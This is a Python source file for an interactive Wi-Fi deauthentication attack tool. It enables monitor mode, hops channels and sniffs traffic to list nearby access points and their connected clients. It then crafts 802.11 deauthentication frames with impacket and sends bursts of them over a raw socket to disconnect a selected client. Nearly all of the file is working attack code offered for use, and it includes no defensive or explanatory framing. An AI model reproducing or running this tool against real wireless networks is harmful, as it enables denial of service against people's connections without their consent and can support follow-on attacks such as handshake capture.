import array
import pcapy
import impacket
from impacket import ImpactDecoder
import sys, time, random, os, signal
from multiprocessing import Process, Queue
import binascii
import threading
import curses
import urwid
import random
import socket

CLIENTS = {}
SSIDs = {}
MAC = {}
RTD = ImpactDecoder.RadioTapDecoder()
MAX_LEN      = 1514    # max size of packet to capture
PROMISCUOUS  = 1       # promiscuous mode?
READ_TIMEOUT = 100     # in milliseconds
PCAP_FILTER  = ''      # empty => get everything (or we could use a BPF filter)
MAX_PKTS     = -1      # number of packets to capture; -1 => no limit

def channel_hopper():
    while True:
        try:
            channel = random.randrange(1,14)
            #channel = random.choice([1,2,6,11,9])
            os.system("iw dev %s set channel %d" % ("mon0", channel))
            time.sleep(1)
        except KeyboardInterrupt:
            break

def getBssid(arr):
	#Get Binary array to MAC addr format
	out = []
	s = binascii.hexlify(arr)
	t = iter(s)
	st = ':'.join(a+b for a,b in zip(t,t))
	return st

def signal_handler(signal, frame):
   # exit routine
    os.system("iw mon0 del")
    p.terminate()
    p.join()
    raise urwid.ExitMainLoop()
    sys.exit(0)

def deauth_packet_generator(channel1,channel2,bssid,client=None):
	# Dot11 Deauth packet generation using impacket
	broadcast = ret_binary("ff:ff:ff:ff:ff:ff")
	if client == None:
		client = broadcast

	# Create RadioTap Frame
	radio = impacket.dot11.RadioTap()
	radio.set_channel(channel1,channel2)    # work on channel
	
	# Create Dot11 Frame
	dot11 = impacket.dot11.Dot11(FCS_at_end = False)
	dot11.set_type_n_subtype(impacket.dot11.Dot11Types.DOT11_TYPE_MANAGEMENT_SUBTYPE_DEAUTHENTICATION)
	#dot11.set_fromDS(0)
	#dot11.set_toDS(0)
	#dot11.set_moreFrag(0)
	#dot11.set_retry(0)
	#dot11.set_powerManagement(0)
	#dot11.set_moreData(0)
	#dot11.set_protectedFrame(0)
	#dot11.set_order(0)

	# create Managment Frame
	m = impacket.dot11.Dot11ManagementFrame()
	sequence = random.randint(0, 4096)
	#m.set_duration(0)
	m.set_source_address(bssid)
	m.set_bssid(bssid)
	m.set_destination_address(client)
	#m.set_fragment_number(0)
	m.set_sequence_number(sequence)

	# De-auth Request Frame
	d = impacket.dot11.Dot11ManagementDeauthentication()
	
	m.contains(d)
	dot11.contains(m)
	radio.contains(dot11)
	
	return radio.get_packet()

def packet_handler(header, data):
	radio_packet = RTD.decode(data)
	channel = radio_packet.get_channel()
	dot11 = radio_packet.child()

	# Data Frames Parser

	if dot11.get_type() == impacket.dot11.Dot11Types.DOT11_TYPE_DATA:
		base = dot11.child()
		ip  =getBssid(base.get_address1())
		client = getBssid(base.get_address3()) 
		bssid = getBssid(base.get_address2())
		if bssid == client or client == ip:	
			pass
		else:
			bssid = str(bssid)
			client = str(client)
			if MAC.has_key(bssid):
				MAC[bssid][0].append(ip)
				MAC[bssid][0].append(client)
			else:
				MAC[bssid] = [[client,ip],channel] 

	# Managment Frame parser
	
	elif dot11.get_type() == impacket.dot11.Dot11Types.DOT11_TYPE_MANAGEMENT:
		bssid_base = dot11.child()
		base = dot11.child().child()
		if base.__class__ == impacket.dot11.Dot11ManagementProbeRequest or base.__class__ == impacket.dot11.Dot11ManagementProbeResponse or base.__class__ == impacket.dot11.Dot11ManagementBeacon:
	 		#SSIDs[getBssid(bssid_base.get_bssid())] = base.get_ssid()
			if SSIDs.has_key(base.get_ssid()):
				pass
			else:
				ssid = str(base.get_ssid())
				bssid = str(getBssid(bssid_base.get_bssid()))
				if bssid == "ff:ff:ff:ff:ff:ff":
					pass
				else:
					pr.p_d(ssid,bssid)
		else:
			pass

def runThreads(header,data):
	global p2
	packet_handler(header,data)

def exit_on_q(key):
    # press Q,q to quit and run exit routine
    if key in ('q', 'Q'):
	signal_handler(1,1)

def ret_binary(arr):
	# return binary array from hex string
	arr = arr
	arr = arr.split(':')
	hx = ''.join(arr)
	hx = hx.decode("hex")
	return array.array('B',hx)

def sniffer():
	#que = q
	# pcapy raw sniffer
	c = pcapy.open_live("mon0", MAX_LEN, PROMISCUOUS, READ_TIMEOUT)
	c.loop(-1, runThreads)
	
			
def magic():
	#global p1
	# start sniffer loop in a thread
	t2 = threading.Thread(target=sniffer)
	t2.daemon = True
	t2.start()
	#p1 = Process(target=sniffer)
	#p1.start()


def send_packet(pkt,num,bar):
	# create a L2 raw_socket, binding to interface and sending packet
	p = pkt
	n = num
	s = socket.socket(socket.AF_PACKET,socket.SOCK_RAW)
	s.bind(('mon0',0))
	for i in range(num):
		s.send(str(p))
		bar.set_completion(bar.current+1)
		#pr.pb.set_completion(pr.pb.current+1)
	s.close()


class Col(urwid.Columns):
	# SSIDs Box with 'enter' key handler to get clients to the selected AP
	def keypress(self,size,key):
		#self.selectable = True
		self.bssid = self.contents[1][0].text
		self.ssid = SSIDs[self.bssid]	
		if key != 'enter':
			return super(Col, self).keypress(size, key)
		
		if MAC.has_key(self.bssid):
			del pr.walker2[:]
			clients = list(set(MAC[self.bssid][0]))
			for x in clients:
				CLIENTS[x] = self.bssid
				pg = urwid.ProgressBar('pg normal','pg complete',done=64)
				#pg.selectable = True
				pr.walker2.append(Col2([('weight',2,urwid.SelectableIcon(x,cursor_position=0)),('weight',2,pg)]))
		else:
			del pr.walker2[:]
			pr.console(u'Not Found Col')
			pr.walker2.append(Box2(u'Not Found Col',cursor_position=0))


class Col2(urwid.Columns):
	# Clients Box with 'enter' key handler to start De-Auth
	def keypress(self,size,key):
		if key != 'enter':
			return super(Col2, self).keypress(size, key)
		client = self.contents[0][0].text
		bssid = CLIENTS[client]
		bin_bssid = ret_binary(bssid)
		bin_client = ret_binary(client)
		channel = MAC[bssid][1]
		#pr.walker2.append(Box2(bssid,cursor_position=0))
		pkt = deauth_packet_generator(channel[0],channel[1],bin_bssid,bin_client)
		self.contents[1][0].set_completion(0)
		send_packet(pkt,64,self.contents[1][0])
		pr.console(u'De-Authing client '+ client +' from BSSID '+bssid+' on Channel '+str(channel))
		pr.console(u'Done')

class Box2(urwid.SelectableIcon):
	# Clients Box with 'enter' key handler to start De-Auth
	def keypress(self,size,key):
		if key != 'enter':
			return super(Box2, self).keypress(size, key)

		bssid = CLIENTS[self.text]
		bin_bssid = ret_binary(bssid)
		bin_client = ret_binary(self.text)
		channel = MAC[bssid][1]
		#pr.walker2.append(Box2(bssid,cursor_position=0))
		pkt = deauth_packet_generator(channel[0],channel[1],bin_bssid,bin_client)	
		send_packet(pkt,64)
		pr.console(u'De-Authing client '+ self.text +' from BSSID '+bssid+' on Channel '+str(channel))
		pr.console(u'Done')
		

class MainProg(object):
	def __init__(self):
		# craete interface with Frame and the body is made of 3 columns and wrap the columns in lineBoxes to have borders
		self.walker1 = urwid.SimpleFocusListWalker([])
		self.walker3 = urwid.SimpleFocusListWalker([])
		self.walker2 = urwid.SimpleFocusListWalker([])
		self.div = urwid.Divider()
		self.box = urwid.ListBox(self.walker1)
		self.line = urwid.LineBox(self.box, title='SSID', tlcorner=u'\u250c', tline=u'\u2500', lline=u'\u2502', trcorner=u'\u2510', blcorner=u'\u2514', rline=u'\u2502', bline=u'\u2500', brcorner=u'\u2518')
		self.box2 = urwid.ListBox(self.walker2)
		self.line2 = urwid.LineBox(self.box2, title='Client', tlcorner=u'\u250c', tline=u'\u2500', lline=u'\u2502', trcorner=u'\u2510', blcorner=u'\u2514', rline=u'\u2502', bline=u'\u2500', brcorner=u'\u2518')
		self.box3 = urwid.ListBox(self.walker3)
		self.line3 = urwid.LineBox(self.box3, title='BSSID', tlcorner=u'\u250c', tline=u'\u2500', lline=u'\u2502', trcorner=u'\u2510', blcorner=u'\u2514', rline=u'\u2502', bline=u'\u2500', brcorner=u'\u2518')
		self.pile = urwid.Columns([('weight',2, self.line),('weight',2, self.line2)])
		self.con = urwid.Text([u'Console'])
		self.lineCon = urwid.LineBox(self.con, title='', tlcorner=u'\u250c', tline=u'\u2500', lline=u'\u2502', trcorner=u'\u2510', blcorner=u'\u2514', rline=u'\u2502', bline=u'\u2500', brcorner=u'\u2518')
		self.title = urwid.Text([u'Wireless De-atuth PeW PeW !!!'])
		self.lineTitle = urwid.LineBox(self.title, title='', tlcorner=u'\u250c', tline=u'\u2500', lline=u'\u2502', trcorner=u'\u2510', blcorner=u'\u2514', rline=u'\u2502', bline=u'\u2500', brcorner=u'\u2518')
		self.top = urwid.Frame(self.pile, footer=self.lineCon,header=self.lineTitle)
		self.editing = False
		self.main()
		self.index = 0
		#signal.signal(signal.SIGINT, signal_handler)


	def main(self):
		global p
		# program Main loop 
		self.console('Console: Initializing Monitor device ....')
		interface = sys.argv[1]
		# Enable monitor mode on device
		#os.system("iw dev %s interface add mon0 type monitor && ifconfig mon0 down" % interface) 
		os.system("ifconfig %s down" % interface)
		os.system("iw dev %s interface add mon0 type monitor" % interface)
		time.sleep(5)
		os.system("ifconfig mon0 down")
		os.system("iw dev mon0 set type monitor")
		os.system("ifconfig mon0 up")


		self.console('Console: Initializing Channel Hopper ....')
		# start the channel hopper
		p = Process(target = channel_hopper)
		p.start()

		# start the sniffer
		self.console('Start Capturing Packets from Monitor device ....')
		magic()

	def p_d(self,ssid,bssid):
		# save ssids, bssids to dict
		if SSIDs.has_key(bssid):
			pass
		else:
			SSIDs[bssid] = ssid
			self.walker1.append(Col([('weight',2,urwid.Text(ssid)),('weight',2,urwid.SelectableIcon(bssid))]))
			loop.draw_screen()

	def console(self, message):
		# prgoram console at footer 
		self.msg = message
		self.con.set_text('Console: '+self.msg)

if __name__ == '__main__':

	if len(sys.argv) != 2:
		print "Usage %s monitor_interface" % sys.argv[0]
		sys.exit(1)	
	else:
			pr = MainProg()
			palette = [
				('reversed', 'standout', ''),
				('pg normal', 'white','black','standout'),
				('pg complete','white', 'dark magenta'),
			]
	#	try:
			loop = urwid.MainLoop(pr.top, palette, unhandled_input=exit_on_q)
			loop.run()
	#	except Exception as e:
			#signal_handler(1,1)

